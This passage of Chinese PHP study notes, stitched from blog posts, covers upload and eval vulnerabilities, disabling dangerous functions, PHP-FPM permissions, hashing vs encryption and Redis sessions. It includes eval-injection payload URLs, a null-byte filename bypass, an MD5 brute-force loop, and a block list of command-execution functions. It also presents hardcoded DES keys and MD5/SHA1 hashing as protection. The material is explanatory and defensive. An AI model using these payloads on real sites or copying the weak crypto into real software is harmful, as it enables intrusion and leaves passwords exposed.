$html .= $target_path . ' succesfully uploaded!';
.
.

这段代码有好多个漏洞，比如XSCH, XSS等，但是没有RCE这种严重的漏洞，因为从PHP 5.3.1开始，空字符的问题已经被修复了。这里的问题是，DVWA将用户上传的name参数传递给了move_upload_file()函数，那么 php 执行的操作可能就是这样子的：

move_uploaded_file($_FILES[‘name’][‘tmp_name’],”/file.php\x00.jpg”);这本应该创建一个名为file.php\x00.jpg的文件，但实际上创建的文件是file.php。

这样，就绕过了代码中对后缀名的校验，并且事实证明GD库中又很多其他函数也存在这个问题(比如getimagesize(), imagecreatefromjpeg()…等)，可以看这个例子。

如果你机器的php版本在 5.4.39, 5.5.x – 5.5.23, 或者 5.6.x – 5.6.7，可以通过检查文件名中是否有\x00字符来解决本文中所述的问题。

安全建议如果你的机器上存在这个漏洞，建议使用随机字符串重命名文件名，而不是使用用户上传上来的name参数的值。

```
### `eval` 函数执行脚本
```
https://www.jb51.net/hack/122114.html
前段时间一个程序出的问题。就和这差不多。



复制代码代码如下:

<?php
$code="${${eval($_GET[c])}}";
?>
对于上面的代码。如果在URL提交http://www.phpeval.cn/test.php?c=phpinfo(); 就可以发现phpinfo()被执行了。而相应的提交c=echo 11111; 发现1111也被输出了。这个代码被执行了。

(好些PHP的代码在写文件的时候。都没有注意到这一点。他们在代码中写php的文件的时候。把代码加在双引号之内。然后过滤掉双引号。认为这样就不能执行了。实际上是可以的。)
还有一些利用方式，比如：



复制代码代码如下:

<?php
$code=addslashes($_GET[c]);
eval(""$code"");
?>
提交 http://www.site.cn/test.php?c=${${phpinfo()}}; phpinfo()就被执行。如果提交
http://www.site.cn/test.php?c=${${eval($_GET[d])}};&d=phpinfo();

这样的话，d后面的代码也被执行。

解决方法：

eval函数减弱了你的应用的安全性,因为它给被求值的文本赋予了太多的权力。强烈建议不要使用eval函数。
```
### `disable_functions` 关闭高危函数
```
https://www.jb51.net/article/29750.htm
phpinfo()
功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。
危险等级：中

passthru()
功能描述：允许执行一个外部程序并回显输出，类似于 exec()。
危险等级：高

exec()
功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。
危险等级：高

system()
功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。
危险等级：高

chroot()
功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式
PHP 时才能工作，且该函数不适用于 Windows 系统。
危险等级：高

scandir()
功能描述：列出指定路径中的文件和目录。
危险等级：中

chgrp()
功能描述：改变文件或目录所属的用户组。
危险等级：高

chown()
功能描述：改变文件或目录的所有者。
危险等级：高

shell_exec()
功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。
危险等级：高

proc_open()
功能描述：执行一个命令并打开文件指针用于读取以及写入。
危险等级：高

proc_get_status()
功能描述：获取使用 proc_open() 所打开进程的信息。
危险等级：高

error_log()
功能描述：将错误信息发送到指定位置（文件）。
安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，
执行任意命令。
危险等级：低

ini_alter()
功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。
具体参见 ini_set()。
危险等级：高

ini_set()
功能描述：可用于修改、设置 PHP 环境配置参数。
危险等级：高

ini_restore()
功能描述：可用于恢复 PHP 环境配置参数到其初始值。
危险等级：高

dl()
功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。
危险等级：高

pfsockopen()
功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。
危险等级：高

syslog()
功能描述：可调用 UNIX 系统的系统层 syslog() 函数。
危险等级：中

readlink()
功能描述：返回符号连接指向的目标文件内容。
危险等级：中

symlink()
功能描述：在 UNIX 系统中建立一个符号链接。
危险等级：高

popen()
功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。
危险等级：高

stream_socket_server()
功能描述：建立一个 Internet 或 UNIX 服务器连接。
危险等级：中

putenv()
功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数
修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。
危险等级：高

禁用方法如下：
打开/etc/php.ini文件，
查找到 disable_functions ，添加需禁用的函数名，如下：
phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen
```

### FPM 独立用户与组，给每个目录特定权限
```
https://blog.csdn.net/asdfzxc123789/article/details/101782479
核心总结：php-fpm/apache 进程所使用的用户，不能是网站文件所有者。 凡是违背这个原则，则不符合最小权限原则。

 

根据生产环境不断反馈，发现不断有 php网站被挂木马，绝大部分原因是因为权限设置不合理造成。因为服务器软件，或是 php 程序中存在漏洞都是难免的，在这种情况下，如果能正确设置 Linux 网站目录权限， php 进程权限，那么网站的安全性实际上是可以得到保障的。

 

那么，造成网站被挂木马的原因是什么？

 

1. 　ftp 连接信息被破解，对这个原因，可行的办法就是使用非常复杂的FTP 用户名（不要使用常用的用户名），如果是固定作业，可考虑使用 iptables 防火墙限制来源 IP 。但是一些情景下，可能需要使用 VPN 以便远程维护。　即网站维护者需要使用 FTP 修改网站文件时，必须先登录到 IDC 机房的 VPN 服务器上，再进行后续的操作。

 

2. 　网站服务器软件/ 配置 /php 程序存在漏洞，被利用 
在讨论这个问题前，先说明文件及进程权限的几个概念:

A.  FTP用户对网站目录具有最大修改权限，那么网站的文件所有者一定属于 FTP, 　这是毋庸置疑的 ,  否则如何修改文件呢？

B.  php-fpm/apache/nginx 进程对网站文件至少需要有读取权限，例如，以下命令即可查看这两个进程所使用的账号：







通过上图，我们可以发现，nginx 和 php-fpm 子进程账号是 nobody 。

 

我们再查看网站文件目录的权限： 


发现网站文件所有者是www 账号，那说明：

|  nginx和 php 对网站只有读取权限，无写入权限

l  如果php 程序需要对网站某些文件有写入权限，需要手工将文件或目录权限修改为 777

l  因为php-fpm 子进程是以 nobody 运行，那么 php-fpm 生成的新文件所有者也是 nobody,  这时 ftp 用户将无法修改这些文件，解铃还需系铃人，当 php 生成文件后，需要调用 chmod("/somedir/somefile", 0777) 将文件权限修改为 777 ，以便 FTP 用户也可以修改这个文件。

l  经常有开发人员找我请求重设php 生成的文件的权限。

 

l  如果php-fpm/apache/nginx进程以网站文件所有者用户运行，那意味着 php-fpm/apache/nginx 进程对整个网站目录具有可写权限，噩梦也就由此开始。

 

但是我们发现，有不少系统管理员为了省事，违背了Linux 最小化权限的原则，设置 php-fpm/apache/nginx进程以网站文件所有者账号运行，当然这样可能会方便 php 开发人员（ php-fpm 进程对整个网站目录具有可写权限），但是这样一来， Linux 体系的文件系统权限原则将被打破，所有的安全措施将形同虚设。可以想象的是，万一 php 程序中有漏洞，攻击者上传木马，便可以修改网站的所有文件，网站首页被黑，也就不足为怪了。

 

退一步，如果我们设置了较严格的权限，就算php 程序中存在漏洞，那么攻击者也只能篡改权限为 777 的目录，其它的文件是无法被改写的，网站不就就得更安全了吗？

 

核心总结：php-fpm/apache/nginx进程所使用的用户，不能是网站文件所有者。 凡是违背这个原则，则不符合最小权限原则。

 

经过我参阅网上关于nginx, php-fpm 配置的文章教程和市面上的一些书籍，发现有不少人受这些文章的误导，直接让 php-fpm/apache/nginx进程以网站所有者账号运行，例如张宴的《实战 nginx  取代 apache 的高性能 Web服务器》一书的 52 页中，存在以下设置：

<value name="user">www</value>

<value name="group">www</value>

 

而在第50 页，设置网站文件所有者也为 www 用户：

chown -R www:www /data0/htdocs/blog

显然，此书的这部分内部，对初学者有误导，针对这个问题，我已经向本书作者发邮件，希望其能在第二版中进行强调声明，以免由于过度宽松的权限配置，造成一些安全隐患。

 

官方提供的配置文件中，php-fpm 子进程使用 nobody 用户，这完全是合理的，无须修改。

 

那么nginx 的子进程用户，如何设置合理？　我的建议是也使用 nobody （对错误日志写入等无影响），设置方法如下：

nginx.conf文件第一行设置为 user    nobody; ,  再执行 nginx -s reload 即可。

 

php-fpm子进程用户设置方法：

编辑文件php-fpm.conf （一般位于 /usr/local/php/etc/php-fpm.conf,  视安装参数为准），找到 user 、group 两个参数的定义，将其设置为nobody( 默认已经是 nobody) ，再重启 php-fpm 进程即可。

 

 

网站可写目录的特殊注意

这里的可写，是相对php-fpm 子进程而言。一个网站最容易出安全问题的即是可写目录，如果可写目录权限能控制严格，安全系数也将大大提高。

我们认为，一个网站可写目录主要分为以下几种：

1. 　php 数据缓存目录，如 discuz 的 forumdata 目录，就存放了大量数据缓存文件。此类目录一般会禁止用户直接访问，但是 discuz 在这个目录下又存放了不少 js, css 文件，我们并不能简单地拒绝用户访问这个目录。显然，这个目录下的所有文件，不能直接交给 php 解析，我们后面会给出解决方案。

2. 　附件上传目录。显然此类目录需要开启访问，但不能交由php 引擎解析（即这个目录下的所有文件均视为普通静态文件）。

3. 　静态文件生成目录，这类目录下的文件全部应视为静态文件。

4. 　日志目录，　一般都会拒绝用户直接访问之。

 

也就是说对网站开发人员而言，需要对可写目录实现动静分离，不同性能的文件，应该区别对待之，这样也就方便系统管理员，设置合理的nginx 规则，以提高安全性。

 

简单地去掉php 文件的执行权限，并不能阻止 php-fpm 进程解析之。

 

接下来，根据以上总结，系统管理员如何配置nginx 的目录规则，才更安全呢？

1. 　数据缓存目录 /cache/ 
这个目录的特点是需要777 权限，无须提供给用户访问，那么可以按以下参考配置 nginx 

location ~ "^/cache" {

return 403;

}

 

location ~ "\.php$" {

fastcgi_pass 127.0.0.0:9000;

....................

}

 

这时，任何用户将无法访问/cache/ 目录内容，即使

2.　附件上传目录  attachments

此目录的特点是需要开放访问权限，但所有文件不能由php 引擎解析（包括后缀名改为 gif 的木马文件）

location ~ "^/attachments" {

 

}

 

location ~ "\.php$" {

fastcgi_pass 127.0.0.0:9000;

....................

}

 

注意，上面对attachments 目录的 location 定义中是没有任何语句的。 nginx 对正则表达式的location 匹配优先级最高，任何一个用正则表达式定义的 location,  只要匹配一次，将不会再匹配其它正则表达式定义的 location 。

 

现在，请在attachments 目录下建立一个 php 脚本文件，再通过浏览器访问安，我们发现浏览器提示下载，这说明 nginx 把 attachments 目录下的文件当成静态文件处理，并没有交给 php fastcgi 处理。这样即使可写目录被植入木马，但因为其无法被执行，网站也就更安全了。

 

显然，重要的php 配置文件，请勿放在此类目录下。

 

3. 　静态文件生成目录 public 
这些目录一般都是php 生成的静态页的保存目录，显然与附件目录有类似之处，按附件目录的权限设置即可。 

可以预见的是，如果我们设置了较严格的权限，即使网站php 程序存在漏洞，木马脚本也只能被写入到权限为 777 的目录中去，如果配合上述严格的目录权限控制，木马也无法被触发运行，整个系统的安全性显然会有显著的提高。

 

但是网站可写目录的作用及权限，只有开发人员最为清楚。这方面需要php 开发人员和系统管理员积极沟通。我们使用的方式是：项目上线前，开发人员根据以文档形式提供网站可写目录的作用及权限，由系统管理员针对不同目录进行权限设置。任何一方修改了网站目录权限，但未体现到文档中，我们认为是违反工作流程的。
https://www.cnblogs.com/hanyouchun/p/5159889.html
```

### 了解 Hash 与 Encrypt 区别
```
https://www.cnblogs.com/ghjbk/p/7418406.html
1、哈希（Hash）与加密（Encrypt）的区别
      在本文开始，我需要首先从直观层面阐述哈希（Hash）和加密（Encrypt）的区别，因为我见过很多朋友对这两个概念不是很清晰，容易混淆两者。而正确区别两者是正确选择和使用哈希与加密的基础。

      概括来说，哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要），而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。

      具体来说，两者有如下重要区别：

      1、哈希算法往往被设计成生成具有相同长度的文本，而加密算法生成的文本长度与明文本身的长度有关。

      例如，设我们有两段文本：“Microsoft”和“Google”。两者使用某种哈希算法得到的结果分别为：“140864078AECA1C7C35B4BEB33C53C34”和“8B36E9207C24C76E6719268E49201D94”，而使用某种加密算法的到的结果分别为“Njdsptpgu”和“Hpphmf”。可以看到，哈希的结果具有相同的长度，而加密的结果则长度不同。实际上，如果使用相同的哈希算法，不论你的输入有多么长，得到的结果长度是一个常数，而加密算法往往与明文的长度成正比。

      2、哈希算法是不可逆的，而加密算法是可逆的。

      这里的不可逆有两层含义，一是“给定一个哈希结果R，没有方法将E转换成原目标文本S”，二是“给定哈希结果R，即使知道一段文本S的哈希结果为R，也不能断言当初的目标文本就是S”。其实稍微想想就知道，哈希是不可能可逆的，因为如果可逆，那么哈希就是世界上最强悍的压缩方式了——能将任意大小的文件压缩成固定大小。

      加密则不同，给定加密后的密文R，存在一种方法可以将R确定的转换为加密前的明文S。

      这里先从直观层面简单介绍两者的区别，等下文从数学角度对两者做严谨描述后，读者朋友就知道为什么会有这两个区别了。

2、哈希（Hash）与加密（Encrypt）的数学基础
      从数学角度讲，哈希和加密都是一个映射。下面正式定义两者：

      一个哈希算法是一个多对一映射，给定目标文本S，H可以将其唯一映射为R，并且对于所有S，R具有相同的长度。由于是多对一映射，所以H不存在逆映射

使得R转换为唯一的S。

      一个加密算法是一个一一映射，其中第二个参数叫做加密密钥，E可以将给定的明文S结合加密密钥Ke唯一映射为密文R，并且存在另一个一一映射，可以结合Kd将密文R唯一映射为对应明文S，其中Kd叫做解密密钥。

      下图是哈希和加密过程的图示：



      有了以上定义，就很清楚为什么会存在上文提到的两个区别了。由于哈希算法的定义域是一个无限集合，而值域是一个有限集合，将无限集合映射到有限集合，根据“鸽笼原理(Pigeonhole principle)”，每个哈希结果都存在无数个可能的目标文本，因此哈希不是一一映射，是不可逆的。

      而加密算法是一一映射，因此理论上来说是可逆的。

      但是，符合上面两个定义的映射仅仅可以被叫做哈希算法和加密算法，但未必是好的哈希和加密，好的哈希和加密往往需要一些附加条件，下面介绍这些内容。

      一个设计良好的哈希算法应该很难从哈希结果找到哈希目标文本的碰撞（Collision）。那么什么是碰撞呢？对于一个哈希算法H，如果，则S1和S2互为碰撞。关于为什么好的哈希需要难以寻找碰撞，在下面讲应用的时候会详解。另外，好的哈希算法应该对于输入的改变极其敏感，即使输入有很小的改动，如一亿个字符变了一个字符，那么结果应该截然不同。这就是为什么哈希可以用来检测软件的完整性。

      一个设计良好的加密算法应该是一个“单向陷门函数(Trapdoor one-way function)”，单向陷门函数的特点是一般情况下即使知道函数本身也很难将函数的值转换回函数的自变量，具体到加密也就是说很难从密文得到明文，虽然从理论上这是可行的，而“陷门”是一个特殊的元素，一旦知道了陷门，则这种逆转换则非常容易进行，具体到加密算法，陷门就是密钥。

      顺便提一句，在加密中，应该保密的仅仅是明文和密钥。也就是说我们通常假设攻击者对加密算法和密文了如指掌，因此加密的安全性应该仅仅依赖于密钥而不是依赖于假设攻击者不知道加密算法。

3、哈希（Hash）与加密（Encrypt）在软件开发中的应用
      哈希与加密在现代工程领域应用非常广泛，在计算机领域也发挥了很大作用，这里我们仅仅讨论在平常的软件开发中最常见的应用——数据保护。

      所谓数据保护，是指在数据库被非法访问的情况下，保护敏感数据不被非法访问者直接获取。这是非常有现实意义的，试想一个公司的安保系统数据库服务器被入侵，入侵者获得了所有数据库数据的查看权限，如果管理员的口令（Password）被明文保存在数据库中，则入侵者可以进入安保系统，将整个公司的安保设施关闭，或者删除安保系统中所有的信息，这是非常严重的后果。但是，如果口令经过良好的哈希或加密，使得入侵者无法获得口令明文，那么最多的损失只是被入侵者看到了数据库中的数据，而入侵者无法使用管理员身份进入安保系统作恶。

3.1、哈希（Hash）与加密（Encrypt）的选择
      要实现上述的数据保护，可以选择使用哈希或加密两种方式。那么在什么时候该选择哈希、什么时候该选择加密呢？

      基本原则是：如果被保护数据仅仅用作比较验证，在以后不需要还原成明文形式，则使用哈希；如果被保护数据在以后需要被还原成明文，则需要使用加密。

      例如，你正在做一个系统，你打算当用户忘记自己的登录口令时，重置此用户口令为一个随机口令，而后将此随机口令发给用户，让用户下次使用此口令登录，则适合使用哈希。实际上很多网站都是这么做的，想想你以前登录过的很多网站，是不是当你忘记口令的时候，网站并不是将你忘记的口令发送给你，而是发送给你一个新的、随机的口令，然后让你用这个新口令登录。这是因为你在注册时输入的口令被哈希后存储在数据库里，而哈希算法不可逆，所以即使是网站管理员也不可能通过哈希结果复原你的口令，而只能重置口令。

      相反，如果你做的系统要求在用户忘记口令的时候必须将原口令发送给用户，而不是重置其口令，则必须选择加密而不是哈希。

3.2、使用简单的一次哈希（Hash）方法进行数据保护
      首先我们讨论使用一次哈希进行数据保护的方法，其原理如下图所示：



      对上图我想已无需多言，很多朋友应该使用过类似的哈希方法进行数据保护。当前最常用的哈希算法是MD5和SHA1，下面给出在.NET平台上用C#语言实现MD5和SHA1哈希的代码，由于.NET对于这两个哈希算法已经进行很很好的封装，因此我们不必自己实现其算法细节，直接调用相应的库函数即可（实际上MD5和SHA1算法都十分复杂，有兴趣的可以参考维基百科）。

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
using System;
using System.Web.Security;
 
namespace HashAndEncrypt
{
    /// <summary>
    /// 哈希（Hash）工具类
    /// </summary>
    public sealed class HashHelper
    {
        /// <summary>
        /// 使用MD5算法进行哈希
        /// </summary>
        /// <param name="source">源字串</param>
        /// <returns>杂凑字串</returns>
        public static string MD5Hash(string source)
        {
            return FormsAuthentication.HashPasswordForStoringInConfigFile(source, "MD5");
        }
 
        /// <summary>
        /// 使用SHA1算法进行哈希
        /// </summary>
        /// <param name="source">源字串</param>
        /// <returns>杂凑字串</returns>
        public static string SHA1Hash(string source)
        {
            return FormsAuthentication.HashPasswordForStoringInConfigFile(source, "SHA1");
        }
    }
}
3.3、对简单哈希（Hash）的攻击
      下面我们讨论上述的数据保护方法是否安全。

      对于哈希的攻击，主要有寻找碰撞法和穷举法。

      先来说说寻找碰撞法。从哈希本身的定义和上面的数据保护原理图可以看出，如果想非法登录系统，不一定非要得到注册时的输入口令，只要能得到一个注册口令的碰撞即可。因此，如果能从杂凑串中分析出一个口令的碰撞，则大功告成。

      不过我的意见是，对这种攻击大可不必担心，因为目前对于MD5和SHA1并不存在有效地寻找碰撞方法。虽然我国杰出的数学家王小云教授曾经在国际密码学会议上发布了对于MD5和SHA1的碰撞寻找改进算法，但这种方法和很多人口中所说的“破解”相去甚远，其理论目前仅具有数学上的意义，她将破解MD5的预期步骤数从2^80降到了2^69，虽然从数学上降低了好几个数量级，但2^69对于实际应用来说仍然是一个天文数字，就好比以前需要一亿年，现在需要一万年一样。

      不过这并不意味着使用MD5或SHA1后就万事大吉了，因为还有一种对于哈希的攻击方法——穷举法。通俗来说，就是在一个范围内，如从000000到999999，将其中所有值一个一个用相同的哈希算法哈希，然后将结果和杂凑串比较，如果相同，则这个值就一定是源字串或源字串的一个碰撞，于是就可以用这个值非法登录了。

      例如，下文是对MD5的穷举攻击的代码（设攻击范围为000000到999999）：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
using System;
using System.Web.Security;
 
namespace HashAndEncrypt
{
    /// <summary>
    /// MD5攻击工具类
    /// </summary>
    public sealed class MD5AttackHelper
    {
        /// <summary>
        /// 对MD5进行穷举攻击
        /// </summary>
        /// <param name="hashString">杂凑串</param>
        /// <returns>杂凑串的源串或源串碰撞（攻击失败则返回null）</returns>
        public static string AttackMD5(string hashString)
        {
            for (int i = 0; i <= 999999; i++)
            {
                string testString = i.ToString();
                while (testString.Length < 6)
                    testString = "0" + testString;
 
                if (FormsAuthentication.HashPasswordForStoringInConfigFile(testString, "MD5") == hashString)
                    return testString;
            }
 
            return null;
        }
    }
}
      这种看似笨拙的方法，在现实中爆发的能量却是惊人的，目前几乎所有的MD5破解机或MD5在线破解都是用这种穷举法，但就是这种“笨”方法，却成功破解出很多哈希串。纠其缘由，就是相当一部分口令是非常简单的，如“123456”或“000000”这种口令还有很多人在用，可以看出，穷举法是否能成功很大程度上取决于口令的复杂性。因为穷举法扫描的区间往往是单字符集、规则的区间，或者由字典数据进行组合，因此，如果使用复杂的口令，例如“ASDF#$%uiop.8930”这种变态级口令，穷举法就很难奏效了。

3.4、对一次哈希（Hash）的改进——多重混合哈希（Hash）
      上面说过，如果口令过于简单，则使用穷举法可以很有效地破解出一次哈希后的杂凑串。如果不想这样，只有让用户使用复杂口令，但是，很多时候我们并不能强迫用户，因此，我们需要想一种办法，即使用户使用诸如“000000”这种简单密码，也令穷举法难奏效。其中一种办法就是使用多重哈希，所谓多重哈希就是使用不同的哈希函数配合自定义的Key对口令进行多次哈希，如果Key很复杂，那么穷举法将变得异常艰难。

      例如，如果使用下面的混合公式进行哈希：



      如果将Key设为一个极为复杂的字符串，那么在攻击者不知道Key的情况下，几乎无法通过穷举法破解。因为即使S很简单，但是Key的MD5值几乎是无法在合理时间内穷举完的。下面是这种多重混合哈希的代码实现：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
using System;
using System.Web.Security;
 
namespace HashAndEncrypt
{
    /// <summary>
    /// 多重混合哈希工具类
    /// </summary>
    public sealed class HashHelper
    {
        private static readonly String hashKey = "qwer#&^Buaa06";
        /// <summary>
        /// 对敏感数据进行多重混合哈希
        /// </summary>
        /// <param name="source">待处理明文</param>
        /// <returns>Hasn后的数据</returns>
        public static String Hash(String source)
        {
            String hashCode = FormsAuthentication.HashPasswordForStoringInConfigFile(source, "MD5") +
                              FormsAuthentication.HashPasswordForStoringInConfigFile(hashKey, "MD5");
            return FormsAuthentication.HashPasswordForStoringInConfigFile(hashCode, "SHA1");
        }
    }
}
3.5、使用加密（Encrypt）方法进行数据保护
      加密方法如果用于口令保护的话，与上述哈希方法的流程基本一致，只是在需要时，可以使用解密方法得到明文。关于加密本身是一个非常庞大的系统，而对于加密算法的攻击更是可以写好几本书了，所以这里从略。下面只给出使用C#进行DES加密和解密的代码。

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
using System;
using System.Security.Cryptography;
using System.Text;
using System.Web.Security;
 
namespace HashAndEncrypt
{
    /// <summary>
    /// 工具类，封装了加解密相关操作
    /// </summary>
    public sealed class EncryptHelper
    {
        private static readonly Byte[] DesKey = {5, 7, 8, 9, 0, 2, 1, 6};
        private static readonly Byte[] DesVi = { 6, 9, 8, 5, 1, 6, 2, 8 }; 
        /// <summary>
        /// 使用DES算法加密数据
        /// </summary>
        /// <param name="data">待加密数据</param>
        /// <returns>密文</returns>
        public static String Encrypt(String data)
        {
            DESCryptoServiceProvider des = new DESCryptoServiceProvider();
            Encoding utf = new UTF8Encoding();
            ICryptoTransform encryptor = des.CreateEncryptor(DesKey, DesVi);
 
            byte[] bData = utf.GetBytes(data);
            byte[] bEnc = encryptor.TransformFinalBlock(bData, 0, bData.Length);
            return Convert.ToBase64String(bEnc);
        }
 
        /// <summary>
        /// 使用DES算法解密数据
        /// </summary>
        /// <param name="data">待解密数据</param>
        /// <returns>明文</returns>
        public static String Decrypt(String data)
        {
            DESCryptoServiceProvider des = new DESCryptoServiceProvider();
            Encoding utf = new UTF8Encoding();
            ICryptoTransform decryptor = des.CreateDecryptor(DesKey, DesVi);
 
            byte[] bEnc = Convert.FromBase64String(data);
            byte[] bDec = decryptor.TransformFinalBlock(bEnc, 0, bEnc.Length);
            return utf.GetString(bDec);
        }
    }
}
4、总结
      密码学本身是一个非常深奥的数学分支，对于普通开发者，不需要了解过于深入的密码学知识。本文仅仅讲述哈希与加密的基础内容，并对两者做了比较，帮助读者明晰概念，另外，对一些实际应用情况进行了简单的讨论。希望本文对大家有所帮助。看了下时间，零点刚过，祝大家十一快乐！玩得开心！
```

### php在储存session以什么形式存在
```
PHP为session的存储提供了三种方式: 文件/ 内存/ 自定义存储,默认是使用文件存储.
在访问量大的网站上采用这种方式就不大合适,因为这样会导致大量的输入输出的冗余.
我们可以在php.ini更改配置文件或者php脚本中通过相应的函数来设置session文件的存储类型
来改变session文件的存储形式
```
### Session 共享、存活时间
```
https://blog.csdn.net/m_nanle_xiaobudiu/article/details/81177698
一、Session的原理
以下以默认情况举例：

session_start();之后，会生成一个唯一的session_id，每一个用户对应唯一一个session_id，每一个session_id对应服务器端的一个session文件。这个session文件存储着当前session_id的信息，比如下面，就存储了name和age的键值。

 

1、设置Session存储的引擎（本地服务器的文件还是redis等），【php.ini 文件】

[Session]
 
session.save_handler = files
 
session.save_path = /data/SessionLogs
 

2、默认情况下的Session的使用 

<?php
/**
 * session的使用
 * 默认情况（不更改session.save_handle参数时），是存储在文件file中的
 * 默认情况下使用session的情况（用户24分钟内没有刷新操作会过期）
 * 每个用户对应唯一session_id,每一个session_id对应服务器中存储的一个session文件，这个文件中存储了当前session_id的信息，比如下面，就存储了name和age的键值
 */
session_start();
echo session_id();
echo "<br>";
$_SESSION['age'] = 26;
$_SESSION['name'] = 'xiaobudiu';
var_dump($_SESSION);
 

3、在服务器中存储的形式是这样的



 

 

二、使用Redis存储Session
在网站访问量较大时，我们通常会做集群（比如nginx负载均衡等），这时，如何解决session会话的共享问题。

（1）使用ip_hash或者自定义key做负载均衡轮询策略是一个办法，但由于有时候用户可能走代理，所以这个方法其实并不是那么完美。

（2）另一个解决session共享问题的方法就是使用redis或者memcache缓存数据库去存储session，进而实现session共享问题。

 

1、设置php.ini 文件中的session.save_handle 和session.save_path

session.save_handler = Redis
 
session.save_path = "tcp://localhost:6379"
注1：如果连接的是远程redis，需要将localhost换成对应的远程ip地址。像这样，

session.save_handler = Redis
 
session.save_path =  "tcp://47.94.203.119:6379"
注2：如果为redis已经添加了auth权限（requirpass），session.save_path项则应该这样写

session.save_handler = Redis
 
session.save_path =  "tcp://47.94.203.119:6379?persistent=1&database=10&auth=myredisG506"
 

2、使用redis存储session信息

<?php
/**
 * 将session存储在redis中
 */
session_start();
echo session_id();
echo "<br>";
$_SESSION['age'] = 26;
$_SESSION['name'] = 'xiaobudiu';
$_SESSION['sex'] = 'man';
var_dump($_SESSION);
在redis上是以这样的形式进行存储的



 

注：

搭建nginx集群： https://blog.csdn.net/m_nanle_xiaobudiu/article/details/80862272

搭建mysql主从复制架构：https://blog.csdn.net/m_nanle_xiaobudiu/article/details/81086243

搭建redis集群： https://blog.csdn.net/m_nanle_xiaobudiu/article/details/81004557

 
 
三、使用Redis存储Session，并设置Session会话存活时间以及Session中某一元素存活时间
 

封装session类 b.php

<?php
 
 
/**
 * session控制类
 *
 */
 
class Session
{
 
    function __construct($lifetime = 3600)
    {
        //初始化设置session会话存活时间
        ini_set('session.gc_maxlifetime',$lifetime);
    }
 
    /**
     * 设置当前会话session的key-value
     * @param String $name   session name
     * @param Mixed  $data   session data
     * @param Int    $expire 有效时间(秒)
     */
    function set($name, $data, $expire = 600)
    {
        $session_data = array();
        $session_data['data'] = $data;
        $session_data['expire'] = time()+$expire;
        $_SESSION[$name] = $session_data;
    }
 
    /**
     * 读取当前会话session中的key-value
     * @param  String $name  session name
     * @return Mixed
     */
    function get($name)
    {
        if(isset($_SESSION[$name])) {
            if($_SESSION[$name]['expire'] > time()) {
                return $_SESSION[$name]['data'];
            }else{
                self::clear($name);
            }
        }
        return false;
    }
 
    /**
     * 清除当前session会话中的某一key-value
     * @param  String  $name  session name
     */
    function clear($name)
    {
        unset($_SESSION[$name]);
    }
 
    /**
     * 删除当前session_id对应的session文件（清空当前session会话存储）
     */
    function destroy()
    {
        session_destroy();
    }
 
}
 
session类的使用：d.php

<?php
 
require_once 'b.php';
 
session_start();
 
$session = new Session();
$session->set('wan','kkkk',1966);
 
$session->set('name','xiaobudiu');
$session->set('age',26);
$session->set('sex','man');
 
 
//输出当前会话的session存储数据
var_dump($_SESSION);
 
 
 
//unset掉某一个session属性
//$session->clear('name');
 
//删除当前session_id对应session文件
//$session->destroy();
//echo $session->get('sex');
 

redis中显示：

```

## 高阶篇

### GD库 图像处理扩展
```
[GD 和图像处理 函数
http://php.net/manual/zh/ref.image.php
gd_info — 取得当前安装的 GD 库的信息
getimagesize — 取得图像大小
getimagesizefromstring — 从字符串中获取图像尺寸信息
image_type_to_extension — 取得图像类型的文件后缀
image_type_to_mime_type — 取得 getimagesize，exif_read_data，exif_thumbnail，exif_imagetype 所返回的图像类型的 MIME 类型
image2wbmp — 以 WBMP 格式将图像输出到浏览器或文件
imageaffine — 返回经过仿射变换后的图像，剪切区域可选
imageaffinematrixconcat — Concatenate two affine transformation matrices
imageaffinematrixget — Get an affine transformation matrix
imagealphablending — 设定图像的混色模式
imageantialias — 是否使用抗锯齿（antialias）功能
imagearc — 画椭圆弧
imagebmp — Output a BMP image to browser or file
imagechar — 水平地画一个字符
imagecharup — 垂直地画一个字符
imagecolorallocate — 为一幅图像分配颜色
imagecolorallocatealpha — 为一幅图像分配颜色 + alpha
imagecolorat — 取得某像素的颜色索引值
imagecolorclosest — 取得与指定的颜色最接近的颜色的索引值
imagecolorclosestalpha — 取得与指定的颜色加透明度最接近的颜色
imagecolorclosesthwb — 取得与给定颜色最接近的色度的黑白色的索引
imagecolordeallocate — 取消图像颜色的分配
imagecolorexact — 取得指定颜色的索引值
imagecolorexactalpha — 取得指定的颜色加透明度的索引值
imagecolormatch — 使一个图像中调色板版本的颜色与真彩色版本更能匹配
imagecolorresolve — 取得指定颜色的索引值或有可能得到的最接近的替代值
imagecolorresolvealpha — 取得指定颜色 + alpha 的索引值或有可能得到的最接近的替代值
imagecolorset — 给指定调色板索引设定颜色
imagecolorsforindex — 取得某索引的颜色
imagecolorstotal — 取得一幅图像的调色板中颜色的数目
imagecolortransparent — 将某个颜色定义为透明色
imageconvolution — 用系数 div 和 offset 申请一个 3x3 的卷积矩阵
imagecopy — 拷贝图像的一部分
